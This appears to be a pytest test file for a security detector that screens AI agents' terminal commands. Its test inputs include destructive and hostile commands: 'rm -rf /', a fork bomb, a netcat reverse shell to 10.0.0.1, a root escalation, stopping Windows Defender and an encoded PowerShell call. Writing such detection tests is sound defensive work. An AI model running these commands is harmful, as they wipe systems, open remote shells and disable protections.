"""
Tests for Command Analysis Detector (Phase 5).
"""

import uuid
import pytest
from agentshield.contracts.action import ActionRequest
from agentshield.contracts.enums import IntegrationType, ToolCategory
from agentshield.contracts.threat import ThreatCategory, ThreatSeverity
from agentshield.threat_detection.detectors.command_analysis import CommandAnalysisDetector


def _req(cmd: str, tool: str = "execute_command") -> ActionRequest:
    return ActionRequest(
        tenant_id=uuid.uuid4(),
        agent_id=uuid.uuid4(),
        integration_type=IntegrationType.API,
        tool_name=tool,
        tool_category=ToolCategory.TERMINAL,
        operation="execute",
        arguments={"command": cmd},
        resource=cmd,
    )


class TestCommandAnalysisDetector:
    def setup_method(self):
        self.detector = CommandAnalysisDetector()

    def test_catastrophic_rm_rf(self):
        req = _req("rm -rf /")
        findings = self.detector.analyze(req)
        assert len(findings) >= 1
        assert any("Catastrophic System Destruction" in f.title for f in findings)
        assert findings[0].severity == ThreatSeverity.CRITICAL

    def test_fork_bomb_detected(self):
        req = _req(":(){ :|:& };:")
        findings = self.detector.analyze(req)
        assert len(findings) >= 1
        assert any("Catastrophic System Destruction" in f.title for f in findings)

    def test_reverse_shell_netcat(self):
        req = _req("nc -e /bin/bash 10.0.0.1 4444")
        findings = self.detector.analyze(req)
        assert len(findings) >= 1
        assert any("Reverse Shell" in f.title for f in findings)
        assert findings[0].severity == ThreatSeverity.CRITICAL

    def test_privilege_escalation_sudo_su(self):
        req = _req("sudo su - root")
        findings = self.detector.analyze(req)
        assert len(findings) >= 1
        assert any("Privilege Escalation" in f.title for f in findings)

    def test_defense_evasion_sc_stop(self):
        req = _req("sc stop WinDefend")
        findings = self.detector.analyze(req)
        assert len(findings) >= 1
        assert any("Security Defense Evasion" in f.title for f in findings)

    def test_encoded_powershell_execution(self):
        req = _req("powershell.exe -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==")
        findings = self.detector.analyze(req)
        assert len(findings) >= 1
        assert any("Encoded Shell Execution" in f.title for f in findings)

    def test_benign_administrative_commands(self):
        for cmd in ("git status", "pytest tests/ -v", "npm run build", "dir C:\\Projects", "ls -la"):
            req = _req(cmd)
            findings = self.detector.analyze(req)
            assert len(findings) == 0, f"False positive for safe command: {cmd}"
